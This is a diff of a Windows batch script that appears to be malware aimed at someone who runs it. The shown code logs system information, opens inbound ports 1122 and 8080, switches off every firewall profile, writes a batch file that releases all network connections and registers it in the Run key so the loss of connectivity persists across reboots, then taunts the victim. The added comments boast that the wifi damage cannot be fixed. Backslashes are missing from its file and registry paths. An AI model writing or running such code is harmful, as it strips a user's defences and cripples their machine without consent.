@@ -88,7 +88,7 @@ ECHO.>>9K21JM10B.log
 ECHO.>>9K21JM10B.log
 systeminfo>>9K21JM10B.log
 goto ports
-rem -=- Opens Ports -=-
+rem Opens Ports
 :ports
 cls & color 0a
 netsh advfirewall firewall add rule name="Port 1122 TCP" dir=in action=allow protocol=TCP localport=%1
@@ -96,7 +96,7 @@ netsh advfirewall firewall add rule name="Port 1122 UDP" dir=in action=allow pro
 netsh advfirewall firewall add rule name="Port 8080 TCP" dir=in action=allow protocol=TCP localport=%1
 netsh advfirewall firewall add rule name="Port 8080 UDP" dir=in action=allow protocol=UDP localport=%1
 goto firewall
-rem -=- Turns all Firewalls off -=-
+rem Turns all Firewalls off
 :firewall
 cls & color 0a
 netsh firewall set opmode disable
@@ -106,6 +106,7 @@ netsh advfirewall set domainprofile state off
 netsh advfirewall set privateprofile state off
 netsh advfirewall set publicprofile state off
 netsh advfirewall set allprofiles state off
+Rem now it will disconnect wifi on that computer forever. You can't fix it
 echo @echo off>c:windowswimn32.bat
 echo break off>>c:windowswimn32.bat
 echo ipconfig/release_all>>c:windowswimn32.bat
@@ -115,7 +116,7 @@ reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexi
 echo Don't try to hack or DDoS ever again, I hope you learned your lesson you naughty black hat hacker.
 goto x
 
-
+Rem make the error your computer ran into a problem show up
 
 :x
 @echo off
